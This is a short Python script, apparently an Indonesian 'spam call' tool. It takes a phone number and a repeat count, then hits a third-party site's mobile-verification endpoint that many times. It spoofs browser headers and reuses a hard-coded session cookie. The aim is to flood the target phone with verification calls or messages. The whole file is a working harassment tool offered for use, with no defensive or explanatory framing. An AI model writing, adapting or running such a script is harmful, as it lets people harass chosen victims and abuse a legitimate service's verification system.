import requests,json,os,time

os.system("clear")
banner = """
\tspam call
\t––– ––– –––

[•] Creator : Wlz wilza
[•] YouTube : Otaku Wilza
_______ _______ _______
"""
print(banner)
nomor=input("[•] Nomor: ")
jumlah=int(input("[•] Jumlah : "))

ua = {
"Host":"id.jagreward.com",
"Connection":"keep-alive",
"Content-Length":"18",
"Accept":"*/*",
"X-Requested-With":"XMLHttpRequest",
"sec-ch-ua-mobile":"?1",
"Save-Data":"on",
"User-Agent":"Mozilla/5.0 (Linux; Android 10; Redmi 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36",
"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
"Origin":"https://id.jagreward.com",
"Sec-Fetch-Site":"same-origin",
"Sec-Fetch-Mode":"cors",
"Sec-Fetch-Dest":"empty",
"Referer":"https://id.jagreward.com/member/register/",
"Accept-Encoding":"gzip, deflate, br",
"Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
'Cookie':'PHPSESSID=74oqgpprto3jfoah925j5nh30j; DAPROPS="sjs.webGlRenderer:Adreno (TM) 506|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:2|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:0|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0"; _ga=GA1.3.1357316409.1630121870; _gid=GA1.3.1777379431.1630121870; _gat=1'
}
url = f"https://id.jagreward.com/member/verify-mobile/{nomor}/"
for i in range(int(jumlah)):
  req = requests.get(url,headers=ua).text
  Wlz = json.loads(req)
  xn = Wlz["result"]
  xx = Wlz["message"]
  print(f"Result: {xn}, Message: {xx}")
  time.sleep(5)
